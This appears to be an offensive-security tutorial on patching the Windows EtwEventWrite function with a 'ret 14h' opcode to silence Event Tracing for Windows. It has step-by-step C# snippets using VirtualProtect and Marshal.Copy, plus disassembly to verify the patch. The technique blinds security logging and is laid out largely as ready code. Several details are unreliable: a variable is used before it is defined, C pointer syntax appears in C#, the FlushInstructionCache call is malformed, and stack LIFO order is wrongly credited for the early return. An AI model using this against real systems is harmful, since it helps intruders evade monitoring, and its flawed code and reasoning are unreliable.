# Patching ETW Tracing Functions

Event Tracing for Windows (ETW) is loaded at the runtime of every new process, commonly originating from the CLR (Common Language Runtime). ETW events are sent from userland and issued directly from the current process. Attackers can patch ETW by writing pre-defined opcodes to an in-memory function, effectively disabling its functionality.

## High-Level Concept of Patching

At its core, patching aims to force an application to return or quit before reaching the function we want to patch. Consider this pseudo-code:

```c
int x = 1;
int y = 3;
return x + y; // Output: 4

int x = 1;
return x;
int y = 3;
return x + y; // Output: 1
```

If a `return` is inserted before the original return, the program will not execute subsequent lines. This leverages the stack's LIFO (Last In First Out) structure: the last item pushed is the first popped out.

> **Diagram:**  
> LIFO structure — items are pushed to the top and popped from the top.

## Applying the Concept to ETW

To patch ETW, we need to identify how the return is called in memory. If we can write a return opcode at the start of the function, it will execute before any other code. The stack's LIFO structure ensures this behavior.

### Identifying Patch Points

From previous research, we know ETW is written from the `EtwEventWrite` function in the CLR. To find patch points, we examine the function's disassembly:

```
779f2459 33cc         xor ecx, esp
779f245b e8501a0100   call ntdll!_security_check_cookie
779f2460 8be5         mov esp, ebp
779f2462 5d           pop ebp
779f2463 c21400       ret 14h
```

The `ret 14h` instruction ends the function and returns to the previous application. According to IA-32 documentation, `ret` pops the last value from the stack, and its parameter (here, `14h`) specifies the number of bytes to release.

To neuter the function, an attacker can write the opcode bytes for `ret 14h` (`c2 14 00`) to memory, patching the function.

> **Diagram:**  
> LIFO structure with assembly — `ret 14h` is pushed to the top and popped out.

## Technical Steps for ETW Patching

ETW patching can be broken down into five steps:

1. **Obtain a handle for `EtwEventWrite`**
2. **Modify memory permissions of the function**
3. **Write opcode bytes to memory**
4. **Reset memory permissions (optional)**
5. **Flush the instruction cache (optional)**

### Step 1: Obtain Function Handle

```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```

### Step 2: Modify Memory Permissions

```csharp
uint oldProtect;
Win32.VirtualProtect(
    etwFunction, 
    (UIntPtr)patch.Length, 
    0x40, // PAGE_EXECUTE_READWRITE
    out oldProtect
);
```

### Step 3: Write Opcode Bytes

```csharp
byte[] patch = new byte[] { 0xc2, 0x14, 0x00 };
Marshal.Copy(
    patch, 
    0, 
    etwFunction, 
    patch.Length
);
```

### Step 4: Restore Memory Permissions

```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```

### Step 5: Flush Instruction Cache

```csharp
Win32.FlushInstructionCache(
    etwFunction,
    NULL
);
```

These steps can be compiled into a script or session for experimentation.

## Verifying the Patch

After patching, the disassembled function should look like:

```
779f23c0 c21400       ret 14h
779f23c3 00ec         add ah, ch
779f23c5 83e4f8       and esp, 0FFFFFFF8h
779f23c8 81ece0000000 sub esp, 0E0h
```

This matches the LIFO diagram described earlier. Once patched, `EtwEventWrite` will always return immediately when called.

---

> **Note:**  
> While this technique is effective, it may not be suitable for all environments as it could suppress more logs than intended, impacting integrity.
